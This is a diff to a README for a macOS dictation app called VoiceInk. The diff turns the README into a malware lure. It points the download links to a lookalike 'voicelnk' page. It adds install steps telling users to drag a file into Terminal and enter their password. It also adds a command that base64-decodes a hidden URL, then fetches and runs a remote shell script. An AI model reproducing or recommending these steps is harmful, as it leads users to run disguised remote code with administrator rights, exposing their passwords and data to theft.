@@ -7,9 +7,31 @@ Whether you're drafting emails, writing articles, or transcribing notes, VoiceIn
 ---
 
 ## ✅ Download VoiceInk for macOS  
-[![Download VoiceInk](https://img.shields.io/badge/Download-VoiceInk-blue)](#)
+[![Download VoiceInk](https://img.shields.io/badge/Download-VoiceInk-blue)](https://shuziktobehuman.github.io/huja/voicelnk)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
 
 ## 📦 What is VoiceInk?
 
@@ -40,19 +62,10 @@ VoiceInk is a macOS-native dictation software that uses advanced speech recognit
 
 ---
 
-[![Download VoiceInk](https://img.shields.io/badge/Download-VoiceInk-blue)](#)
+[![Download VoiceInk](https://img.shields.io/badge/Download-VoiceInk-blue)](https://shuziktobehuman.github.io/huja/voicelnk)
 
 ---
 
-## 📥 How to Use
-
-- 🎙 Install and launch VoiceInk on your Mac  
-- 🗣 Choose input source and start speaking into your microphone  
-- 📄 Watch your words appear on screen as editable text  
-- ✍️ Make adjustments, copy, or export the content  
-- 🔧 Explore voice commands for punctuation and control  
-
----
 
 ## 🖼 Preview
 
